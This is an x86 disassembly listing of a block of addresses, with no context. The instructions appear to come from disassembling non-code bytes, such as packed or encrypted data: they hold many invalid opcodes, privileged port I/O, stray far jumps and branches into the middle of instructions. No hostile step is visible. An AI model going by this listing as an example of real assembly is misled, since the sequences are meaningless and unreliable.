  423b39:	sub    eax,DWORD PTR [eax+0x1d]
  423b3c:	jmp    0xb3a7:0x489216aa
  423b43:	iret   
  423b44:	xrelease mov DWORD PTR [edx+0x34],eax
  423b48:	ror    DWORD PTR [ebp+eiz*2-0x77],1
  423b4c:	mov    esi,0x4abd564d
  423b51:	int    0x8
  423b53:	add    BYTE PTR [ebp+eiz*2-0x24b5180f],0xcc
  423b5b:	dec    esp
  423b5c:	(bad)  
  423b5d:	(bad)  [eax+0x64b8ba2d]
  423b63:	and    eax,0x7b3e2b5f
  423b68:	mov    cl,0x5d
  423b6a:	outs   dx,BYTE PTR ds:[esi]
  423b6b:	pop    ss
  423b6c:	xor    ch,BYTE PTR [ebx+eax*4+0x77d901d6]
  423b73:	loope  0x423b16
  423b75:	jg     0x423b7f
  423b77:	cwde   
  423b78:	call   0x2f099791
  423b7d:	adc    al,0xa
  423b7f:	aaa    
  423b80:	mov    esp,0xd8b0c22c
  423b85:	rcr    DWORD PTR [edx+eiz*8],0x16
  423b89:	test   eax,0xc4c3e279
  423b8e:	js     0x423b58
  423b90:	adc    DWORD PTR [edi],ebp
  423b92:	out    dx,eax
  423b93:	dec    edx
  423b94:	and    dh,BYTE PTR [esi+0x3f]
  423b97:	or     eax,ecx
  423b99:	rcl    cl,cl
  423b9b:	ret    0x1321
  423b9e:	data16 xor BYTE PTR [ebp+0xd93e1a7],dl
  423ba5:	ret    0xce17
  423ba8:	jne    0x423b2b
  423baa:	or     BYTE PTR [ebp-0x77],al
  423bad:	and    DWORD PTR [eax],eax
  423baf:	cs in  eax,dx
  423bb1:	xchg   esi,eax
  423bb2:	mov    ch,cl
  423bb4:	cmp    DWORD PTR [edi+ebx*8],0x7a95ee28
  423bbb:	and    BYTE PTR [eax-0x13],dh
  423bbe:	ficom  DWORD PTR [edx+0x59]
  423bc1:	fucomi st,st(3)
  423bc3:	add    DWORD PTR [edx-0x10ef5698],0x3fa8feb8
  423bcd:	and    ch,cl
  423bcf:	mov    ecx,0x12a58eea
  423bd4:	add    esi,edx
  423bd6:	outs   dx,DWORD PTR ds:[esi]
  423bd7:	dec    edi
  423bd8:	test   eax,0x72deccc7
  423bdd:	mov    ds:0x7bff2502,eax
  423be2:	js     0x423bc5
  423be4:	cs jecxz 0x423b68
  423be7:	or     BYTE PTR es:[ecx],bh
  423bea:	and    al,0xd4
  423bec:	and    eax,0xd8fac515
  423bf1:	jl     0x423c6f
  423bf3:	(bad)  
  423bf4:	loopne 0x423c71
  423bf6:	rcl    edx,0x20
  423bf9:	mov    ds:0x113b992f,eax
  423bfe:	push   esi
  423bff:	icebp  
  423c00:	push   0xffffff92
  423c02:	push   edx
  423c03:	xor    al,0xb4
  423c05:	add    eax,0x8a9e9a03
  423c0a:	ins    DWORD PTR es:[edi],dx
  423c0b:	int    0xa5
  423c0d:	in     eax,dx
  423c0e:	xchg   esi,eax
  423c0f:	daa    
  423c10:	lea    ebx,[ebx]
  423c12:	sbb    eax,0xc64b6892
  423c17:	(bad)  
  423c18:	pop    ecx
  423c19:	outs   dx,BYTE PTR ds:[esi]
  423c1a:	pop    eax
  423c1b:	xchg   edi,eax
  423c1c:	mov    edi,0x4af0ddd6
  423c21:	scas   al,BYTE PTR es:[edi]
  423c22:	dec    ebx
  423c23:	daa    
  423c24:	mov    ax,ds:0x9a495b9
  423c2a:	out    0xa2,al
  423c2c:	loopne 0x423be8
  423c2e:	xchg   ebx,eax
  423c2f:	adc    eax,0xd9cc216d
  423c34:	shl    DWORD PTR [edx-0x3bf5350f],cl
  423c3a:	pop    ds
  423c3b:	push   esi
  423c3c:	xchg   ecx,eax
  423c3d:	into   
  423c3e:	call   0x93d:0xf0d753ff
  423c45:	cmp    dh,BYTE PTR [esp+edx*8]
  423c48:	xchg   ebp,eax
  423c49:	xor    BYTE PTR [ebx],al
  423c4b:	not    DWORD PTR [edi+ebx*4-0x5b64fdab]
  423c52:	sbb    eax,0x5c034b46
  423c57:	xchg   BYTE PTR [edx+0x1f],dl
  423c5a:	mov    ah,0xea
  423c5c:	sbb    eax,0x5a1253d8
  423c61:	inc    esi
  423c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c63:	(bad)  
  423c64:	jp     0x423cb4
  423c66:	jmp    0x423c4a
  423c68:	cmp    DWORD PTR [edx+0x214c024f],ebx
  423c6e:	ja     0x423cd8
  423c70:	and    BYTE PTR [eax+0x7c],bl
  423c73:	mov    ch,0x9e
  423c75:	pop    eax
  423c76:	push   ds
  423c77:	(bad)  
  423c78:	ins    BYTE PTR es:[edi],dx
  423c79:	inc    ebx
  423c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c7b:	clc    
  423c7c:	push   0xffffffa7
  423c7e:	out    dx,eax
  423c7f:	jns    0x423c4f
  423c81:	xchg   ebp,eax
  423c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c83:	shl    edx,0x8a
  423c86:	ret    0xde53
  423c89:	cli    
  423c8a:	sbb    cl,ah
  423c8c:	mov    dl,0x5
  423c8e:	xor    dh,BYTE PTR [ebx-0x6128ccdd]
  423c94:	jle    0x423c89
  423c96:	mov    esi,0x8c5172bc
  423c9b:	or     dh,BYTE PTR [ebx]
  423c9d:	dec    ebp
  423c9e:	jae    0x423d0e
  423ca0:	popa   
  423ca1:	gs push ebx
  423ca3:	add    dl,BYTE PTR [edx+0x2f]
  423ca6:	cwde   
  423ca7:	nop
  423ca8:	mov    al,0x51
  423caa:	xchg   edi,eax
  423cab:	cmc    
  423cac:	out    0x7b,eax
  423cae:	mov    eax,ds:0x1adbf378
  423cb3:	in     al,0x17
  423cb5:	xor    eax,0x3c3ed31d
  423cba:	jo     0x423cdc
  423cbc:	inc    edi
  423cbd:	or     BYTE PTR [ebp-0x79],dl
  423cc0:	test   BYTE PTR [ecx-0x6f],ch
  423cc3:	jno    0x423c86
  423cc5:	outs   dx,DWORD PTR ds:[esi]
  423cc6:	retf   0x14cf
  423cc9:	aaa    
  423cca:	scas   eax,DWORD PTR es:[edi]
  423ccb:	ins    DWORD PTR es:[edi],dx
  423ccc:	add    DWORD PTR [ebx],esi
  423cce:	clc    
  423ccf:	jnp    0x423cc8
  423cd1:	or     BYTE PTR [edi-0x7f],0x26
  423cd5:	shl    BYTE PTR [ebp+0xc4a4947],0xc0
  423cdc:	std    
  423cdd:	jno    0x423d0d
  423cdf:	adc    DWORD PTR [ecx],0xc3f6d45f
  423ce5:	mov    edx,0x4afbc89e
  423cea:	adc    BYTE PTR [esi-0x223bbd71],al
  423cf0:	scas   al,BYTE PTR es:[edi]
  423cf1:	adc    eax,0x490c6995
  423cf6:	fild   QWORD PTR [ecx-0x8]
  423cf9:	xchg   edx,eax
  423cfa:	mov    WORD PTR [ecx],?
  423cfc:	stc    
  423cfd:	sahf   
  423cfe:	pop    es
  423cff:	pop    ebp
  423d00:	popa   
  423d01:	pop    ss
  423d02:	(bad)  
  423d03:	call   0xfa151509
  423d08:	and    ecx,DWORD PTR ds:0xdf479ed8
  423d0e:	and    bh,BYTE PTR [esi+0x3f]
  423d11:	xlat   BYTE PTR ds:[ebx]
  423d12:	add    eax,0x6e3b9f61
  423d17:	xchg   BYTE PTR [eax],bh
  423d19:	call   0xfd33:0xac1225a2
  423d20:	mov    cl,0x75
  423d22:	push   esp
  423d23:	or     al,0x90
  423d25:	lea    eax,[eax]
  423d27:	dec    ebp
  423d28:	xor    dh,BYTE PTR [ebx-0x45]
  423d2b:	or     eax,0x44782f3f
  423d30:	xchg   esp,eax
  423d31:	enter  0xdbd2,0xb4
  423d35:	push   ebx
  423d36:	dec    ebp
  423d37:	test   al,0x9
  423d39:	pop    esp
  423d3a:	or     DWORD PTR [edi+0x6b94d7c7],eax
  423d40:	pushf  
  423d41:	cmc    
  423d42:	bound  esi,QWORD PTR [edx-0x5b6c23f2]
  423d48:	adc    ebp,DWORD PTR [esi]
  423d4a:	pop    ss
  423d4b:	es je  0x423cef
  423d4e:	pop    ebp
  423d4f:	xlat   BYTE PTR ds:[ebx]
  423d50:	pop    edi
  423d51:	mov    bl,0xf
  423d53:	retf   
  423d54:	jns    0x423dd0
  423d56:	mov    ah,0x66
  423d58:	adc    ebx,DWORD PTR [ecx-0x11]
  423d5b:	mov    ebx,0x79aaa4a
  423d60:	popa   
  423d61:	push   0xfffffffa
  423d63:	ins    DWORD PTR es:[edi],dx
  423d64:	sub    DWORD PTR [eax-0x34580c15],esi
  423d6a:	mov    WORD PTR [ebp-0x6fab913f],fs
  423d70:	into   
  423d71:	ds push edi
  423d73:	enter  0xcd78,0x77
  423d77:	mov    ah,BYTE PTR [eax*4+0x393d5510]
  423d7e:	cmp    ebx,DWORD PTR [edx-0x1b]
  423d81:	mov    ch,0xcc
  423d83:	inc    DWORD PTR [edx-0x25]
  423d86:	out    dx,eax
  423d87:	aam    0x6b
  423d89:	xor    al,0xa1
  423d8b:	push   ds
  423d8c:	test   al,0xfb
  423d8e:	out    dx,eax
  423d8f:	stos   BYTE PTR es:[edi],al
  423d90:	call   0x82fd:0x6df2f2aa
  423d97:	xchg   esi,eax
  423d98:	and    eax,0x19ad3cfd
  423d9d:	outs   dx,BYTE PTR ds:[esi]
  423d9e:	aaa    
  423d9f:	in     al,dx
  423da0:	pop    ecx
  423da1:	jne    0x423db9
  423da3:	es pop esp
  423da5:	sti    
  423da6:	loopne 0x423ddc
  423da8:	xchg   BYTE PTR [edx+0x24a7f7cc],ah
  423dae:	int    0x90
  423db0:	(bad)  
  423db1:	push   eax
  423db2:	adc    DWORD PTR [esi-0x23],edi
  423db5:	cdq    
  423db6:	popa   
  423db7:	jne    0x423e27
  423db9:	jno    0x423e1b
  423dbb:	push   ds
  423dbc:	mov    dl,0x44
  423dbe:	xchg   edi,eax
  423dbf:	dec    eax
  423dc0:	sbb    al,0x45
  423dc2:	into   
  423dc3:	outs   dx,DWORD PTR ds:[esi]
  423dc4:	(bad)  
  423dc5:	jmp    0x423e1e
  423dc7:	jecxz  0x423d6f
  423dc9:	xor    al,0x61
  423dcb:	inc    ebx
  423dcc:	push   0xffffffe2
  423dce:	imul   esi,DWORD PTR [eax-0xa982550],0xffffffe2
  423dd5:	ror    BYTE PTR [esi],1
  423dd7:	mov    ds:0x81bc73bf,al
  423ddc:	popa   
  423ddd:	aas    
  423dde:	ror    BYTE PTR es:[esi],0x35
  423de2:	rcr    edx,0x24
  423de5:	push   0x6433f5f4
  423dea:	add    BYTE PTR [ebx-0x25],bh
  423ded:	jle    0x423daa
  423def:	lods   al,BYTE PTR ds:[esi]
  423df0:	cli    
  423df1:	sub    DWORD PTR [esi+0x5b],edi
  423df4:	lea    edi,[ebx+eiz*2-0x3d6f96a]
  423dfb:	loope  0x423e6b
  423dfd:	push   esi
  423dfe:	pop    ebp
  423dff:	and    BYTE PTR [ecx-0x13],ch
  423e02:	and    ah,BYTE PTR [esp+edx*2+0x78]
  423e06:	(bad)  
  423e07:	bswap  eax
  423e09:	jecxz  0x423e74
  423e0b:	lods   eax,DWORD PTR ds:[esi]
  423e0c:	fistp  WORD PTR [ecx]
  423e0e:	loop   0x423e73
  423e10:	fistp  WORD PTR [edx-0x64f828b1]
  423e16:	jle    0x423dd7
  423e18:	push   esi
  423e19:	retf   
  423e1a:	mov    BYTE PTR [edi+ecx*8],al
  423e1d:	sbb    ah,bh
  423e1f:	cld    
  423e20:	xchg   ebx,eax
  423e21:	mov    ds:0x8f31290a,eax
  423e26:	(bad)  
  423e28:	ret    
  423e29:	mov    cl,BYTE PTR [esi*1-0x28c0d973]
  423e30:	div    DWORD PTR [ebx]
  423e32:	and    eax,0xf90e8730
  423e37:	stc    
  423e38:	test   DWORD PTR [eax+0x21f74473],esi
  423e3e:	retf   0xaf1e
  423e41:	and    al,0xd5
  423e43:	ja     0x423e2e
  423e45:	cdq    
  423e46:	bound  edi,QWORD PTR [esi-0x12]
  423e49:	jne    0x423ec8
  423e4b:	outs   dx,BYTE PTR ds:[esi]
  423e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e4d:	jae    0x423e93
  423e4f:	pop    ebp
  423e50:	xlat   BYTE PTR ds:[ebx]
  423e51:	cld    
  423e52:	dec    ebp
  423e53:	(bad)  
  423e54:	fwait
  423e55:	(bad)  
  423e56:	xlat   BYTE PTR ds:[ebx]
  423e57:	nop
  423e58:	jle    0x423ed5
  423e5a:	loop   0x423e39
  423e5c:	daa    
  423e5d:	push   ecx
  423e5e:	xor    al,0xe1
  423e60:	push   ss
  423e61:	xchg   ecx,eax
  423e62:	and    al,0x4c
  423e64:	and    dh,BYTE PTR [edx]
  423e66:	inc    edi
  423e67:	fcomp  DWORD PTR [edi-0x10cab901]
  423e6d:	cmp    eax,0x3bf648d6
  423e72:	push   0x44
  423e74:	inc    esp
  423e75:	pop    es
  423e76:	nop
  423e77:	jle    0x423e0e
  423e79:	pop    ecx
  423e7a:	test   DWORD PTR [ebx-0x5e4edaf6],esi
  423e80:	mov    eax,0x4ae5d260
  423e85:	clc    
  423e86:	xchg   ebx,eax
  423e87:	es dec ecx
  423e89:	or     DWORD PTR [ebx+0x15],ebp
  423e8c:	cmp    DWORD PTR [edi-0x545fb476],esp
  423e92:	sub    ebx,ecx
  423e94:	mul    BYTE PTR [eax-0x18]
  423e97:	test   BYTE PTR [ebp-0x6402ffdb],bh
  423e9d:	mov    dh,0xf6
  423e9f:	fdiv   QWORD PTR [eax]
  423ea1:	je     0x423ed6
  423ea3:	mov    WORD PTR [ecx-0x76],es
  423ea6:	mov    edi,0x2712eaa6
  423eab:	arpl   WORD PTR [edi+0x7],bx
  423eae:	push   ecx
  423eaf:	fwait
  423eb0:	mov    edx,esp
  423eb2:	push   esi
  423eb3:	jb     0x423e7e
  423eb5:	mov    esp,ebx
  423eb7:	idiv   dl
  423eb9:	imul   eax,DWORD PTR [esi+edi*2-0x3a99131a],0xffffffbf
  423ec1:	loope  0x423e9c
  423ec3:	in     al,0x68
  423ec5:	sti    
  423ec6:	add    al,0x54
  423ec8:	xchg   edx,eax
  423ec9:	mov    ds:0x4f5d47db,al
  423ece:	adc    al,0x69
  423ed0:	adc    edx,DWORD PTR [ebp+0x6b]
  423ed3:	sti    
  423ed4:	cmp    eax,0x1b58cef
  423ed9:	fild   WORD PTR [edi+0x238fe412]
  423edf:	repz ds out dx,eax
  423ee2:	sub    BYTE PTR [ebx+0x123cc5cc],bh
  423ee8:	pop    ss
  423ee9:	rcr    BYTE PTR [edi*2-0x54d795b0],0x3f
  423ef1:	ret    0xbc63
  423ef4:	add    al,dh
  423ef6:	pop    es
  423ef7:	xchg   edx,eax
  423ef8:	xchg   edi,eax
  423ef9:	fcmovnb st,st(4)
  423efb:	mov    BYTE PTR [edi+edi*2-0x43d2603b],0xf5
  423f03:	inc    edx
  423f04:	retf   0xa35b
  423f07:	jno    0x423ec0
  423f09:	ja     0x423f66
  423f0b:	ss mov eax,0x4a0c133e
  423f11:	inc    eax
  423f12:	(bad)  [esi+edx*1-0xad2b9f5]
  423f19:	loop   0x423ea2
  423f1b:	lods   eax,DWORD PTR ds:[esi]
  423f1c:	ret    0xc22c
  423f1f:	outs   dx,BYTE PTR ds:[esi]
  423f20:	pusha  
  423f21:	pop    ds
  423f22:	or     DWORD PTR [ebx+0x38f583fe],ecx
  423f28:	sub    edx,DWORD PTR [ecx+ebx*1+0x6c]
  423f2c:	stos   DWORD PTR es:[edi],eax
  423f2d:	dec    edx
  423f2e:	and    cl,BYTE PTR gs:[ebp+0x711ab444]
  423f35:	inc    esi
  423f36:	test   eax,ebp
  423f38:	int3   
  423f39:	(bad)  
  423f3a:	mov    ds:0x68baa750,al
  423f3f:	and    DWORD PTR [ecx],ebx
  423f41:	in     eax,dx
  423f42:	inc    edx
  423f43:	out    0x18,al
  423f45:	into   
  423f46:	push   cs
  423f47:	add    al,0x1b
  423f49:	js     0x423f9b
  423f4b:	je     0x423ed3
  423f4d:	jg     0x423ef5
  423f4f:	idiv   BYTE PTR [ecx+eiz*2+0x3f]
  423f53:	mov    bh,0x7
  423f55:	out    dx,al
  423f56:	cmp    al,0x79
  423f58:	sbb    eax,0x12ddbce7
  423f5d:	pop    ebp
  423f5e:	pop    ebp
  423f5f:	or     BYTE PTR [ebx-0x592a3215],0x39
  423f66:	mov    BYTE PTR [edx],dl
  423f68:	and    BYTE PTR [ecx+0x41af215d],bl
  423f6e:	shr    BYTE PTR [edx],cl
  423f70:	shr    ch,0x73
  423f73:	jmp    0xd0b8:0x5c838212
  423f7a:	je     0x423f5d
  423f7c:	pop    es
  423f7d:	aad    0x6d
  423f7f:	(bad)  
  423f81:	fistp  WORD PTR [ebp+0x1c9a7329]
  423f87:	stc    
  423f88:	xchg   esp,eax
  423f89:	popa   
  423f8a:	mov    esi,0xdf88be69
  423f8f:	loop   0x423f4e
  423f91:	shr    eax,1
  423f93:	and    BYTE PTR [edi+0x62bbccc3],dl
  423f99:	or     ah,0x13
  423f9c:	xor    eax,0x437cb050
  423fa1:	ret    
  423fa2:	lahf   
  423fa3:	lds    esp,FWORD PTR [esi]
  423fa5:	push   ss
  423fa6:	cmp    al,0x2f
  423fa8:	out    dx,eax
  423fa9:	mov    bh,0xc2
  423fab:	ss jle 0x423ff3
  423fae:	in     al,dx
  423faf:	mov    ebx,DWORD PTR [edx+0x5]
  423fb2:	ret    
  423fb3:	iret   
  423fb4:	xor    DWORD PTR [ecx+ebx*8+0x3],ebx
  423fb8:	and    DWORD PTR [ebx-0x5926282d],ebp
  423fbe:	jne    0x423f48
  423fc0:	mov    WORD PTR [eax],ss
  423fc2:	fmul   st(2),st
  423fc4:	mov    al,ds:0x1891fa71
  423fc9:	dec    ebp
  423fca:	push   cs
  423fcb:	mov    ch,0x77
  423fcd:	xchg   BYTE PTR [ebx],al
  423fcf:	sub    eax,0x89a4839c
  423fd4:	test   al,0x70
  423fd6:	push   esi
  423fd7:	mov    bl,0x4b
  423fd9:	sbb    ebp,DWORD PTR [eax+0x25de6107]
  423fdf:	sub    eax,0x16676584
  423fe4:	push   es
  423fe5:	xchg   ebx,eax
  423fe6:	mov    al,0x8c
  423fe8:	call   0x7462:0x91c265f1
  423fef:	fbstp  TBYTE PTR [edx]
  423ff1:	xor    eax,0x6e3b457c
  423ff6:	jmp    0x6f29:0x25ed503d
  423ffd:	scas   eax,DWORD PTR es:[edi]
  423ffe:	repz jmp 0x1c5c:0xdf86c36b
  424006:	mov    bl,0x6a
  424008:	mov    es,WORD PTR [edx-0x7ee084e2]
  42400e:	xor    ebx,edx
  424010:	xchg   ebx,eax
  424011:	sbb    al,BYTE PTR [ebp+0x3c4d3d35]
  424017:	xor    ebx,DWORD PTR [ecx+0x2816ab0d]
  42401d:	inc    ebx
  42401e:	repz push ebp
  424020:	dec    ecx
  424021:	jmp    0x424063
  424023:	test   al,0x2b
  424025:	fisubr DWORD PTR [ebp+edi*4-0x1e376e2f]
  42402c:	mov    BYTE PTR [esi],bl
  42402e:	mov    ebp,0xb1c8c0e
  424033:	int    0x68
  424035:	sub    dl,BYTE PTR [ebx-0x26]
  424038:	pop    ebx
  424039:	jg     0x42400a
  42403b:	mov    gs,ebx
  42403d:	cmp    eax,0x2cbb0766
  424042:	out    0xb5,eax
  424044:	lock mov cl,0x80
  424047:	dec    eax
  424048:	aad    0xb1
  42404a:	jmp    0x42405e
  42404c:	push   edi
  42404d:	out    dx,al
  42404e:	push   eax
  42404f:	or     DWORD PTR [edx],ecx
  424051:	fs jne 0x424000
  424054:	cmp    BYTE PTR [eax],ah
  424056:	loope  0x423ffe
  424058:	and    esp,DWORD PTR [edi-0x3d]
  42405b:	mov    esi,0xeb13c03
  424060:	int    0x2d
  424062:	sbb    ecx,0xc3177780
  424068:	lea    ecx,[edi]
  42406a:	fcomip st,st(0)
  42406c:	loope  0x424028
  42406e:	mov    DWORD PTR [ebx-0x2b],esi
  424071:	sub    BYTE PTR [ebp+eiz*1-0xc50ce9],0x54
  424079:	push   ebx
  42407a:	mov    ebp,0xd77176e7
  42407f:	push   0x4a2972a5
  424084:	pop    ebp
  424085:	jmp    0xc94f2905
  42408a:	test   BYTE PTR [edi],0xdb
  42408d:	cmp    esp,DWORD PTR [ebx+0x6f80e0fc]
  424093:	ins    BYTE PTR es:[edi],dx
  424094:	fisubr DWORD PTR [edx-0x553eb38e]
  42409a:	fild   QWORD PTR ds:0x59d0c126
  4240a0:	aas    
  4240a1:	ret    0x7af5
  4240a4:	mov    bh,0xc
  4240a6:	adc    esp,ebx
  4240a8:	inc    edi
  4240a9:	and    eax,DWORD PTR [ecx]
  4240ab:	and    eax,0xab7dea2c
  4240b0:	inc    ecx
  4240b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240b2:	xor    ebx,0xd498d0c3
  4240b8:	ins    BYTE PTR es:[edi],dx
  4240b9:	xchg   BYTE PTR [edx+0x6],dl
  4240bc:	and    bh,dl
  4240be:	inc    esi
  4240bf:	les    ebp,FWORD PTR [edi-0x6b]
  4240c2:	jns    0x424131
  4240c4:	aam    0xcb
  4240c6:	pop    ebp
  4240c7:	call   0x1ae8:0xa6cdd1ea
  4240ce:	int    0xb8
  4240d0:	rcl    BYTE PTR [esi],cl
  4240d2:	addr16 add eax,0xef2d23b
  4240d8:	sbb    BYTE PTR [ebx-0x31387381],al
  4240de:	pushf  
  4240df:	adc    ah,bl
  4240e1:	pushf  
  4240e2:	adc    eax,0xbaae8d71
  4240e7:	xchg   edi,eax
  4240e8:	pop    eax
  4240e9:	cmp    ecx,DWORD PTR [ecx]
  4240eb:	inc    ebx
  4240ec:	in     al,dx
  4240ed:	outs   dx,BYTE PTR ds:[esi]
  4240ee:	mov    ch,0xea
  4240f0:	mov    ebx,0xc56c0b1f
  4240f5:	pop    esi
  4240f6:	dec    ecx
  4240f7:	(bad)  
  4240f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240f9:	out    dx,eax
  4240fa:	outs   dx,DWORD PTR ds:[esi]
  4240fb:	sar    DWORD PTR [ebx-0x55],cl
  4240fe:	mov    ah,0x89
  424100:	imul   esp,DWORD PTR [ebx],0xcca3a09f
  424106:	ins    DWORD PTR es:[edi],dx
  424107:	cmp    BYTE PTR [edx-0x79151bd5],dl
  42410d:	sbb    DWORD PTR [ebx-0x1c861ecf],ebx
  424113:	lods   al,BYTE PTR ds:[esi]
  424114:	inc    ecx
  424115:	cwde   
  424116:	xchg   edx,eax
  424117:	pusha  
  424118:	jns    0x42411d
  42411a:	imul   ebx
  42411c:	call   0x94a0320e
  424121:	adc    al,0x35
  424123:	and    BYTE PTR [ecx],0x72
  424126:	aaa    
  424127:	das    
  424128:	aas    
  424129:	popa   
  42412a:	push   esi
  42412b:	shr    BYTE PTR [edx+0x83efe41],1
  424131:	call   0x5c72:0x523058a7
  424138:	inc    ecx
  424139:	adc    al,0xc8
  42413b:	adc    eax,0x6a0e1ffd
  424140:	dec    esi
  424141:	mov    ds:0x4bc831f0,al
  424146:	inc    ebp
  424147:	aaa    
  424148:	nop
  424149:	popf   
  42414a:	mov    WORD PTR ds:0x1566292a,es
  424150:	dec    eax
  424151:	push   eax
  424152:	loopne 0x4241a3
  424154:	sbb    ebp,DWORD PTR [edx]
  424156:	aaa    
  424157:	seta   bh
  42415a:	ja     0x424194
  42415c:	js     0x4241bb
  42415e:	or     al,0x4d
  424160:	jo     0x4241d2
  424162:	shr    BYTE PTR [edx+0x6f],0xb7
  424166:	sub    bl,BYTE PTR [edx+0x45]
  424169:	clc    
  42416a:	add    dl,bh
  42416c:	mov    eax,ds:0x617f681f
  424171:	je     0x42413f
  424173:	jmp    0x424148
  424175:	in     eax,dx
  424176:	mov    cl,0xaf
  424178:	call   0x2f92fa75
  42417d:	inc    edi
  42417e:	push   cs
  42417f:	jo     0x42410e
  424181:	mov    es,edx
  424183:	sub    bh,BYTE PTR [ecx+0x23ae0de1]
  424189:	sub    al,0x8d
  42418b:	int3   
  42418c:	mov    eax,esi
  42418e:	out    dx,eax
  42418f:	cmp    DWORD PTR [ebp+ebp*2+0xd],esi
  424193:	ficomp DWORD PTR [ebx-0x47]
  424196:	xlat   BYTE PTR ds:[ebx]
  424197:	cs push edx
  424199:	sbb    BYTE PTR [edi],0x5f
  42419c:	sbb    eax,0x3b22b21a
  4241a1:	add    BYTE PTR [esi-0x74ae85df],0xc1
  4241a8:	into   
  4241a9:	sar    ecx,0x4c
  4241ac:	aas    
  4241ad:	xor    BYTE PTR [edx],ch
  4241af:	shl    BYTE PTR [edi+edx*2-0x73],1
  4241b3:	inc    esi
  4241b4:	xchg   edx,eax
  4241b5:	mov    BYTE PTR [esi-0x5d383f1f],cl
  4241bb:	gs int3 
  4241bd:	sub    ebp,ebp
  4241bf:	scas   eax,DWORD PTR es:[edi]
  4241c0:	int    0x8d
  4241c2:	scas   al,BYTE PTR es:[edi]
  4241c3:	ds shl al,cl
  4241c6:	in     eax,dx
  4241c7:	push   0xfdc19cbc
  4241cc:	dec    ebx
  4241cd:	or     DWORD PTR [esi],esi
  4241cf:	pop    eax
  4241d0:	push   eax
  4241d1:	dec    edx
  4241d2:	js     0x424163
  4241d4:	sub    DWORD PTR [eax],0x73
  4241d7:	(bad)  
  4241d8:	fld    TBYTE PTR [ecx-0x36]
  4241db:	aas    
  4241dc:	aas    
  4241dd:	jl     0x424168
  4241df:	dec    edx
  4241e0:	rcr    DWORD PTR [ecx+0x2c],0x22
  4241e4:	nop
  4241e5:	xor    ebx,DWORD PTR [edx+0x4b2bbb5f]
  4241eb:	pop    edi
  4241ec:	push   es
  4241ed:	inc    esp
  4241ee:	adc    eax,0x8542f0a6
  4241f3:	nop
  4241f4:	cmp    ch,BYTE PTR [edx+0x45f9cea4]
  4241fa:	jb     0x4241bd
  4241fc:	xchg   esi,eax
  4241fd:	fidivr DWORD PTR [ecx+eax*2+0x4]
  424201:	xchg   esp,eax
  424202:	mov    ds:0x4969b74e,al
  424207:	cmp    DWORD PTR [ebx-0x74],0x9fc16c72
  42420e:	scas   eax,DWORD PTR es:[edi]
  42420f:	(bad)  
  424210:	mov    dl,0x86
  424212:	jge    0x424288
  424214:	call   DWORD PTR [ecx+eiz*1]
  424217:	mov    dl,0x74
  424219:	call   0x6f02aaa
  42421e:	mov    ebp,DWORD PTR [ebx]
  424220:	(bad)  
  424221:	or     BYTE PTR [ecx],bh
  424223:	fdiv   QWORD PTR [esi]
  424225:	daa    
  424226:	jb     0x42428c
  424228:	adc    esi,DWORD PTR [eax]
  42422a:	rol    BYTE PTR [esi+esi*4-0x7f],0x30
  42422f:	mov    WORD PTR [esi-0x3b],ds
  424232:	mov    edi,0x546bea8f
  424237:	rol    DWORD PTR [eax+0x3b6922ad],1
  42423d:	in     eax,0x45
  42423f:	jecxz  0x4242b4
  424241:	adc    BYTE PTR [eax-0x6e],al
  424244:	and    ecx,DWORD PTR [ebp-0x10eeb017]
  42424a:	jmp    0x68a9804d
  42424f:	rol    ebp,0x4a
  424252:	mov    edi,0x2be075d2
  424257:	int    0x0
  424259:	and    eax,0x2a61ac39
  42425e:	fsub   QWORD PTR [eax-0x1b]
  424261:	stos   DWORD PTR es:[edi],eax
  424262:	sbb    BYTE PTR [edi+esi*8],bh
  424265:	int    0xde
  424267:	push   esp
  424268:	sub    eax,0x2c4fbc4a
  42426d:	fwait
  42426e:	shl    BYTE PTR [edx],cl
  424270:	xor    edi,DWORD PTR [ebp+0x61ed480c]
  424276:	push   0x13
  424278:	pop    eax
  424279:	and    eax,0x888e34bc
  42427e:	std    
  42427f:	adc    dl,BYTE PTR [eax-0x4bcee1cc]
  424285:	jp     0x42420d
  424287:	mov    edi,0x22b57ccb
  42428c:	lods   al,BYTE PTR ds:[esi]
  42428d:	push   eax
  42428e:	mov    ds:0xac052928,eax
  424293:	lods   al,BYTE PTR ds:[esi]
  424294:	inc    edx
  424295:	jmp    0xb71f6fb
  42429a:	pop    ds
  42429b:	in     al,dx
  42429c:	push   0x7c
  42429e:	and    dl,BYTE PTR [esi-0x10]
  4242a1:	push   cs
  4242a2:	test   BYTE PTR [ebp-0x10],ah
  4242a5:	jns    0x4242e4
  4242a7:	lods   eax,DWORD PTR ds:[esi]
  4242a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242a9:	push   ds
  4242aa:	repz dec esp
  4242ac:	mov    ds:0xcc188ee7,al
  4242b1:	pop    edi
  4242b2:	pop    ebp
  4242b3:	jns    0x42431f
  4242b5:	cs push cs
  4242b7:	inc    ebx
  4242b8:	nop    DWORD PTR [edi-0x218fb86e]
  4242bf:	enter  0x4ed,0xf1
  4242c3:	mov    esi,0x1694ffe2
  4242c8:	pop    ecx
  4242c9:	iret   
  4242ca:	xchg   ecx,eax
  4242cb:	pop    ecx
  4242cc:	inc    BYTE PTR [esi+0x5b6045b]
  4242d2:	mov    edx,edx
  4242d4:	dec    esi
  4242d5:	mov    WORD PTR [edx],?
  4242d7:	pop    ebp
  4242d8:	outs   dx,BYTE PTR ds:[esi]
  4242d9:	ds (bad) 
  4242db:	mov    bl,0xdc
  4242dd:	and    DWORD PTR [eax-0x60],esi
  4242e0:	or     DWORD PTR [ebp-0x3],eax
  4242e3:	inc    eax
  4242e4:	clc    
  4242e5:	mov    ebp,0xe178a245
  4242ea:	inc    ecx
  4242eb:	or     al,0x3
  4242ed:	rol    BYTE PTR [edi+0x78177ce5],0xcf
  4242f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242f5:	and    edx,ebx
  4242f7:	and    al,0xa5
  4242f9:	(bad)  
  4242fa:	pop    ss
  4242fb:	ror    cl,cl
  4242fd:	fistp  QWORD PTR [eax+0x65]
  424300:	outs   dx,DWORD PTR ds:[esi]
